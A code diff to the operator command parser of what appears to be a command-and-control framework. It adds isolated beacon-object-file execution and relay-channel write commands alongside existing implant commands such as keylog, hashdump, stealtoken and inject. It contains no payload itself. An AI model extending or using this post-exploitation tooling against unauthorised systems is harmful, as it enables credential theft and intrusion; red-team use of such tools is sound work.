@@ -26,14 +26,14 @@ export interface CommandInputProps {
   onSubmit: (command: JsonCommand, label: string, opsec: boolean) => void;
 }
 
-/** Known MVP command names (ls is parsed into a fileop on submit). */
+/** Known command names (ls is parsed into a fileop on submit). */
 const KNOWN_COMMANDS = [
   'ping', 'shell', 'exit', 'sleep',
   'download', 'upload', 'ls', 'cd', 'mkdir', 'rm', 'cp', 'mv', 'driveinfo',
   'screenshot', 'screenwatch', 'portscan', 'net', 'clipboard', 'env', 'keylog',
   'hashdump', 'stealtoken', 'steal', 'maketoken', 'rev2self', 'getuid',
-  'bof', 'connect', 'setchannel', 'trex',
-  'inject', 'socks', 'channelclose',
+  'bof', 'bof-iso', 'connect', 'setchannel', 'trex',
+  'inject', 'socks', 'channeldata', 'chanwrite', 'channelclose',
 ] as const;
 
 /** Static OPSEC trip: lsass-touching tooling. UI warning only, never blocks. */
@@ -137,7 +137,7 @@ export function CommandInput({ session, onSubmit }: CommandInputProps) {
         <span className="cmdinput__overlay mono" aria-hidden>
           {tokens.length === 0 ? (
             <span className="cmdinput__placeholder">
-              输入命令… ping / shell / exit / sleep / download / cd / ls
+              输入命令… ping / shell / download / ls / bof-iso / channeldata / chanwrite
             </span>
           ) : (
             <>
@@ -173,7 +173,7 @@ export function CommandInput({ session, onSubmit }: CommandInputProps) {
       <div className="cmdinput__hints">
         {!known && (
           <span className="cmdinput__hint cmdinput__hint--err">
-            未知命令。常用: ping / shell / sleep / download / ls / cd / net / screenshot …
+            未知命令。常用: ping / shell / download / ls / net / screenshot / bof / channeldata / chanwrite …
           </span>
         )}
         {opsec && (
@@ -197,7 +197,7 @@ export interface ParsedCommand {
  * Parse a raw input line into a JsonCommand + display label.
  * Returns null for unknown / malformed commands (caller shows a hint).
  *
- * Grammar (MVP 6 commands):
+ * Grammar (recognized names = KNOWN_COMMANDS; representative forms):
  *   ping
  *   shell <args...>          args joined back into one string
  *   exit
@@ -207,6 +207,8 @@ export interface ParsedCommand {
  *   ls [path]                 -> emitted as a fileop (op 'ls', supported
  *                                end-to-end: protocol FileOp::Ls wire tag 5,
  *                                server mapping, implant fileop_ls).
+ *   bof <name> [isolate] [args...] / channeldata <chan> <hex> /
+ *   chanwrite <chan> <text...>  (see the switch below for the rest)
  */
 export function parseCommand(line: string): ParsedCommand | null {
   const trimmed = line.trim();
@@ -370,12 +372,21 @@ export function parseCommand(line: string): ParsedCommand | null {
       return { command: { type: 'getuid' }, label: 'getuid' };
 
     // --- execution ---
-    case 'bof': {
-      // bof <name> [args...] — data_hex empty (BOF upload via separate flow)
+    case 'bof':
+    case 'bof-iso': {
+      // bof <name> [args...] | bof <name> isolate [args...] | bof-iso <name> [args...]
+      // `isolate` (B3): run the BOF in a sacrificial bof-host child instead of
+      // inline in the beacon — a crashed BOF kills the child, not the beacon.
+      // data_hex empty (BOF upload via separate flow).
       if (args.length === 0) return null;
+      const isolate = name === 'bof-iso' || args[1] === 'isolate';
+      const bofArgs = args[1] === 'isolate' ? args.slice(2) : args.slice(1);
       return {
-        command: { type: 'bof', name: args[0], args: args.slice(1), data_hex: '' },
-        label: `bof ${args[0]}`,
+        command: {
+          type: 'bof', name: args[0], args: bofArgs, data_hex: '',
+          ...(isolate ? { isolate: true } : {}),
+        },
+        label: `${isolate ? 'bof-iso' : 'bof'} ${args[0]}`,
       };
     }
 
@@ -442,6 +453,35 @@ export function parseCommand(line: string): ParsedCommand | null {
           port: sport,
         },
         label: `socks chan=${args[0]} op=${args[1]} ${args[2]}:${sport}`,
+      };
+    }
+
+    case 'channeldata': {
+      // channeldata <chan> <hex> — write bytes into a relay channel
+      // (operator→implant direction, e.g. SOCKS/rportfwd 回写). Hex validated
+      // here so the server never 400s on malformed input.
+      if (args.length < 2) return null;
+      const chan = parseInt(args[0], 10);
+      if (!Number.isFinite(chan)) return null;
+      const data_hex = args.slice(1).join('');
+      if (data_hex.length === 0 || data_hex.length % 2 !== 0 || !/^[0-9a-fA-F]+$/.test(data_hex)) return null;
+      return {
+        command: { type: 'channeldata', chan, data_hex: data_hex.toLowerCase() },
+        label: `channeldata ${chan} (${data_hex.length / 2} bytes)`,
+      };
+    }
+
+    case 'chanwrite': {
+      // chanwrite <chan> <text...> — same write path as channeldata, with the
+      // payload given as UTF-8 text (hex-encoded here for the wire).
+      if (args.length < 2) return null;
+      const chan = parseInt(args[0], 10);
+      if (!Number.isFinite(chan)) return null;
+      const bytes = new TextEncoder().encode(args.slice(1).join(' '));
+      const data_hex = Array.from(bytes, (b) => b.toString(16).padStart(2, '0')).join('');
+      return {
+        command: { type: 'channeldata', chan, data_hex },
+        label: `chanwrite ${chan} (${bytes.length} bytes)`,
       };
     }
 
